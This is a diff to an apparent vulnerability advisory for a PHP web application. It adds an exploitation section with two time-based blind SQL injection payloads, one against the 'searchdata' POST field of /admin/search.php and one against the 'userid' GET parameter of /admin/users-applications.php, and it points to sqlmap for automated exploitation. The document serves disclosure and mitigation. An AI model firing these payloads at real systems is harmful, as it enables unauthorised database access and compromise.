@@ -19,6 +19,41 @@ Both vulnerabilities, if exploited, can result in:
 - Escalation of privileges within the application.  
 - Full compromise of the underlying database system.
 
+## Exploitation Steps for SQL Injection Vulnerabilities
+
+### 1. Exploiting `searchdata` POST Variable on `/admin/search.php`
+
+#### **Objective**: Extract data or manipulate the database using the vulnerable `searchdata` POST parameter.
+
+#### **Steps**:
+1. **Exploit**:
+     ```
+     POST /admin/search.php HTTP/1.1
+     Host: example.com
+     Content-Type: application/x-www-form-urlencoded
+
+     searchdata=hello' AND (SELECT 7003 FROM (SELECT(SLEEP(5)))IBDi) AND 'iSaW'='iSaW&search=
+     ```
+---
+
+### 2. Exploiting `userid` GET Parameter on `/admin/users-applications.php`
+
+#### **Objective**: Use the vulnerable `userid` parameter to extract sensitive data or manipulate the database.
+
+#### **Steps**:
+
+1. **Exploit**:
+     ```
+     http://example.com/admin/users-applications.php?userid=7' AND (SELECT 8511 FROM (SELECT(SLEEP(5)))RdYY) AND 'CBto'='CBto&&fname=1
+     ```
+
+---
+
+### **Key Notes**:
+- Use tools like `sqlmap` for automated exploitation.
+- Be cautious of blind SQL Injection scenarios; use payloads for time-based or error-based testing if no direct feedback is provided.
+- Always confirm exploitation techniques in a legal and authorized testing environment.
+
 ### **Mitigation Steps**  
 1. Use parameterized queries or prepared statements to handle database interactions.  
 2. Sanitize and validate all user inputs, ensuring special characters are escaped or rejected.  
